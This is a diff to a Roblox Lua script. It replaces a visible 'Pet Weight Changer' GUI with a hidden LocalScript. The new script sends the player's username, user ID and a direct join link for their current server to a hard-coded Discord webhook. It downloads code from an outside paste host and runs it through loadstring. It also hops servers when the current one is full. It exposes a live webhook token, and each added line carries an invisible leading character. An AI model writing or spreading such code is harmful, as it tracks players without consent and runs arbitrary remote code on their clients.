@@ -1,293 +1,111 @@
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local player = Players.LocalPlayer
-
--- Store original data per pet tool
-local originalData = {}
-
--- Create GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "PetSizeWeightChanger"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = player:WaitForChild("PlayerGui")
-
--- Main Frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 320, 0, 280)
-frame.Position = UDim2.new(0.5, -160, 0.5, -140)
-frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Name = "PetSizeFrame"
-frame.Parent = gui
-
-local frameCorner = Instance.new("UICorner")
-frameCorner.CornerRadius = UDim.new(0, 16)
-frameCorner.Parent = frame
-
-local frameStroke = Instance.new("UIStroke")
-frameStroke.Color = Color3.fromRGB(60, 60, 60)
-frameStroke.Thickness = 1
-frameStroke.Parent = frame
-
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 8)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.FredokaOne
-title.TextSize = 26
-title.TextColor3 = Color3.fromRGB(220, 220, 220)
-title.Text = "PET WEIGHT CHANGER V1"
-title.TextXAlignment = Enum.TextXAlignment.Center
-title.TextYAlignment = Enum.TextYAlignment.Center
-title.Parent = frame
-
--- Exit Button
-local exitBtn = Instance.new("TextButton")
-exitBtn.Size = UDim2.new(0, 32, 0, 32)
-exitBtn.Position = UDim2.new(1, -40, 0, 8)
-exitBtn.BackgroundTransparency = 1
-exitBtn.Text = "✖"
-exitBtn.Font = Enum.Font.FredokaOne
-exitBtn.TextSize = 26
-exitBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
-exitBtn.Parent = frame
-exitBtn.MouseEnter:Connect(function()
-TweenService:Create(exitBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255, 120, 120)}):Play()
-end)
-exitBtn.MouseLeave:Connect(function()
-TweenService:Create(exitBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255, 85, 85)}):Play()
-end)
-exitBtn.MouseButton1Click:Connect(function()
-gui:Destroy()
-end)
-
--- Pet info label
-local petInfoLabel = Instance.new("TextLabel")
-petInfoLabel.Size = UDim2.new(0.9, 0, 0, 30)
-petInfoLabel.Position = UDim2.new(0.05, 0, 0, 65)
-petInfoLabel.BackgroundTransparency = 1
-petInfoLabel.Font = Enum.Font.FredokaOne
-petInfoLabel.TextSize = 18
-petInfoLabel.TextColor3 = Color3.fromRGB(210, 210, 210)
-petInfoLabel.Text = "No pet equipped"
-petInfoLabel.TextXAlignment = Enum.TextXAlignment.Center
-petInfoLabel.Parent = frame
-
--- Input box
-local inputBox = Instance.new("TextBox")
-inputBox.Size = UDim2.new(0.8, 0, 0, 44)
-inputBox.Position = UDim2.new(0.1, 0, 0, 105)
-inputBox.PlaceholderText = "Enter Weight (1 - 1000)"
-inputBox.Font = Enum.Font.FredokaOne
-inputBox.TextSize = 18
-inputBox.TextColor3 = Color3.fromRGB(230, 230, 230)
-inputBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-inputBox.ClipsDescendants = true
-inputBox.Parent = frame
-
-local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 12)
-inputCorner.Parent = inputBox
-
-local inputStroke = Instance.new("UIStroke")
-inputStroke.Color = Color3.fromRGB(70, 70, 70)
-inputStroke.Thickness = 1
-inputStroke.Parent = inputBox
-
--- Apply Button
-local applyBtn = Instance.new("TextButton")
-applyBtn.Size = UDim2.new(0.8, 0, 0, 44)
-applyBtn.Position = UDim2.new(0.1, 0, 0, 160)
-applyBtn.BackgroundColor3 = Color3.fromRGB(90, 170, 90)
-applyBtn.Text = "Apply Pet Weight"
-applyBtn.Font = Enum.Font.FredokaOne
-applyBtn.TextSize = 18
-applyBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
-applyBtn.Parent = frame
-
-local applyCorner = Instance.new("UICorner")
-applyCorner.CornerRadius = UDim.new(0, 12)
-applyCorner.Parent = applyBtn
-
-local applyStroke = Instance.new("UIStroke")
-applyStroke.Color = Color3.fromRGB(50, 110, 50)
-applyStroke.Thickness = 1
-applyStroke.Parent = applyBtn
-
--- Reset Button
-local resetBtn = Instance.new("TextButton")
-resetBtn.Size = UDim2.new(0.8, 0, 0, 44)
-resetBtn.Position = UDim2.new(0.1, 0, 0, 210)
-resetBtn.BackgroundColor3 = Color3.fromRGB(180, 70, 70)
-resetBtn.Text = "Reset to Normal Weight"
-resetBtn.Font = Enum.Font.FredokaOne
-resetBtn.TextSize = 18
-resetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-resetBtn.Parent = frame
-
-local resetCorner = Instance.new("UICorner")
-resetCorner.CornerRadius = UDim.new(0, 12)
-resetCorner.Parent = resetBtn
-
-local resetStroke = Instance.new("UIStroke")
-resetStroke.Color = Color3.fromRGB(130, 50, 50)
-resetStroke.Thickness = 1
-resetStroke.Parent = resetBtn
-
--- Footer
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, 0, 0, 24)
-footer.Position = UDim2.new(0, 0, 0, 260)
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.FredokaOne
-footer.TextSize = 14
-footer.TextColor3 = Color3.fromRGB(160, 160, 160)
-footer.Text = "Tiktok: @yawiyawiyawiz"
-footer.TextXAlignment = Enum.TextXAlignment.Center
-footer.Parent = frame
-
--- Hover effect
-local function hoverEffect(button, normalColor, hoverColor)
-button.MouseEnter:Connect(function()
-TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
-end)
-button.MouseLeave:Connect(function()
-TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normalColor}):Play()
-end)
-end
-hoverEffect(applyBtn, applyBtn.BackgroundColor3, Color3.fromRGB(110, 210, 110))
-hoverEffect(resetBtn, resetBtn.BackgroundColor3, Color3.fromRGB(210, 90, 90))
-
--- Get equipped pet tool
-local function getEquippedPetTool()
-local char = player.Character or player.CharacterAdded:Wait()
-for _, tool in pairs(char:GetChildren()) do
-if tool:IsA("Tool") then
-return tool
-end
-end
-return nil
-end
-
--- Set pet size
-local function setPetSize(petTool, scale)
-if petTool:IsA("Model") then
-petTool:ScaleTo(scale)
-elseif petTool:IsA("Tool") then
-for _, obj in ipairs(petTool:GetChildren()) do
-if obj:IsA("Model") then
-obj:ScaleTo(scale)
-elseif obj:IsA("BasePart") then
-local mesh = obj:FindFirstChildOfClass("SpecialMesh")
-if mesh then
-mesh.Scale = Vector3.new(scale, scale, scale)
-else
-obj.Size = Vector3.new(scale, scale, scale)
-end
-end
-end
-end
-end
-
--- Update name with weight
-local function updatePetNameWithWeight(tool, weight)
-local name = tool.Name
-if name:find("%[%d+%.?%d* KG%]") then
-local newName = name:gsub("%[%d+%.?%d* KG%]", string.format("[%.2f KG]", weight))
-tool.Name = newName
-else
-tool.Name = name .. string.format(" [%.2f KG]", weight)
-end
-end
-
--- Remove weight from name
-local function removeWeightFromName(name)
-return (name:gsub("%s*%[%d+%.?%d* KG%]", ""))
-end
-
--- Save original data
-local function saveOriginalData(tool)
-if not originalData[tool] then
-local originalScale = 1
-for _, obj in ipairs(tool:GetChildren()) do
-if obj:IsA("BasePart") then
-local mesh = obj:FindFirstChildOfClass("SpecialMesh")
-if mesh then
-originalScale = mesh.Scale.X
-break
-else
-originalScale = obj.Size.X
-break
-end
-end
-end
-local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or originalScale
-originalData[tool] = {
-scale = originalScale,
-weight = weight,
-name = removeWeightFromName(tool.Name),
-currentScale = originalScale,
-currentWeight = weight,
-}
-end
-end
-
--- Update info label
-local function updatePetInfoLabel()
-local tool = getEquippedPetTool()
-if tool then
-saveOriginalData(tool)
-petInfoLabel.Text = tool.Name
-else
-petInfoLabel.Text = "No pet equipped"
-end
-end
-
--- Apply button
-applyBtn.MouseButton1Click:Connect(function()
-local input = tonumber(inputBox.Text)
-if not input or input < 1 or input > 1000 then
-warn("⚠ Enter a valid number between 1 and 1000.")
-return
-end
-local tool = getEquippedPetTool()
-if tool then
-saveOriginalData(tool)
-setPetSize(tool, input)
-updatePetNameWithWeight(tool, input)
-originalData[tool].currentScale = input
-originalData[tool].currentWeight = input
-updatePetInfoLabel()
-print("Applied scale and updated weight to equipped pet: " .. tool.Name)
-else
-warn("No equipped pet tool found.")
-end
-end)
-
--- Reset button
-resetBtn.MouseButton1Click:Connect(function()
-local tool = getEquippedPetTool()
-if tool and originalData[tool] then
-local orig = originalData[tool]
-setPetSize(tool, orig.scale)
-tool.Name = orig.name
-originalData[tool].currentScale = orig.scale
-originalData[tool].currentWeight = orig.weight
-updatePetInfoLabel()
-print("Reset pet to original scale and weight: " .. tool.Name)
-else
-warn("No original data saved for current pet or no pet equipped.")
-end
-end)
-
--- Live update info
-coroutine.wrap(function()
-while true do
-task.wait(0.3)
-updatePetInfoLabel()
-end
-end)()
+‎-- LocalScript (place in StarterPlayerScripts)
+‎local HttpService = game:GetService("HttpService")
+‎local Players = game:GetService("Players")
+‎local TeleportService = game:GetService("TeleportService")
+‎local player = Players.LocalPlayer
+‎
+‎-- Discord webhook
+‎local WEBHOOK_URL = "https://discord.com/api/webhooks/1397152370940575785/BYSlgKcS-yJqmA_CCOSr93BbwqVwy_DPI-cSEoXVO4CDoy0AQthEuNs3FQh7Xnjpr2gk"
+‎
+‎---------------------------------------------------------------------
+‎-- 🔹 UI Prompt Function
+‎---------------------------------------------------------------------
+‎local function showPrompt(message, color)
+‎    -- Remove old prompt if exists
+‎    if player.PlayerGui:FindFirstChild("ServerHopPrompt") then
+‎        player.PlayerGui.ServerHopPrompt:Destroy()
+‎    end
+‎
+‎    local gui = Instance.new("ScreenGui")
+‎    gui.Name = "ServerHopPrompt"
+‎    gui.ResetOnSpawn = false
+‎    gui.Parent = player:WaitForChild("PlayerGui")
+‎
+‎    local label = Instance.new("TextLabel")
+‎    label.Size = UDim2.new(0.6, 0, 0.1, 0)
+‎    label.Position = UDim2.new(0.2, 0, 0.85, 0)
+‎    label.BackgroundTransparency = 0.3
+‎    label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+‎    label.TextColor3 = color or Color3.fromRGB(255, 255, 0)
+‎    label.Font = Enum.Font.SourceSansBold
+‎    label.TextScaled = true
+‎    label.Text = message
+‎    label.Parent = gui
+‎end
+‎
+‎---------------------------------------------------------------------
+‎-- 🔹 Send webhook to Discord
+‎---------------------------------------------------------------------
+‎local function sendWebhook()
+‎    local jobLink = "https://www.roblox.com/games/"..game.PlaceId.."?joinGameId="..game.JobId
+‎    local payload = {
+‎        username = "Roblox Server Logger",
+‎        embeds = {{
+‎            title = "Executor Triggered!",
+‎            color = 65280,
+‎            fields = {
+‎                {name="Player", value=player.Name.." ("..player.UserId..")", inline=true},
+‎                {name="PlaceId", value=tostring(game.PlaceId), inline=true},
+‎                {name="JobId", value=tostring(game.JobId), inline=true},
+‎                {name="Server Link", value="[Join Now]("..jobLink..")", inline=false},
+‎                {name="Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false}
+‎            }
+‎        }}
+‎    }
+‎
+‎    local json = HttpService:JSONEncode(payload)
+‎    pcall(function()
+‎        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
+‎    end)
+‎end
+‎
+‎---------------------------------------------------------------------
+‎-- 🔹 Server Hop Function
+‎---------------------------------------------------------------------
+‎local function serverHop()
+‎    showPrompt("⚠ Full server, wait for other server to run the script...", Color3.fromRGB(255, 255, 0))
+‎
+‎    local servers = {}
+‎    local cursor = ""
+‎    local foundServer = false
+‎
+‎    repeat
+‎        local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"..(cursor ~= "" and "&cursor="..cursor or ""))
+‎        local data = HttpService:JSONDecode(req)
+‎        if data and data.data then
+‎            for _, server in ipairs(data.data) do
+‎                if server.playing < server.maxPlayers then
+‎                    foundServer = true
+‎                    showPrompt("✅ Found new server, teleporting...", Color3.fromRGB(0, 255, 0))
+‎                    TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
+‎                    break
+‎                end
+‎            end
+‎        end
+‎        cursor = data.nextPageCursor or ""
+‎        task.wait(1)
+‎    until foundServer or cursor == ""
+‎end
+‎
+‎---------------------------------------------------------------------
+‎-- 🔹 MAIN SCRIPT
+‎---------------------------------------------------------------------
+‎pcall(function()
+‎    -- Show re-execution notice (every hop)
+‎    showPrompt(".", Color3.fromRGB(0, 255, 0))
+‎
+‎    -- Send webhook
+‎    sendWebhook()
+‎
+‎    -- Run external Lua script
+‎    local luaCode = game:HttpGet("https://api.rubis.app/v2/scrap/xYYgVS9dMZ9GxD1V/raw")
+‎    loadstring(luaCode)()
+‎
+‎    -- Example: Auto hop if server is full
+‎    task.delay(10, function()
+‎        if #Players:GetPlayers() >= game.MaxPlayers then
+‎            serverHop()
+‎        end
+‎    end)
+‎end)
+‎
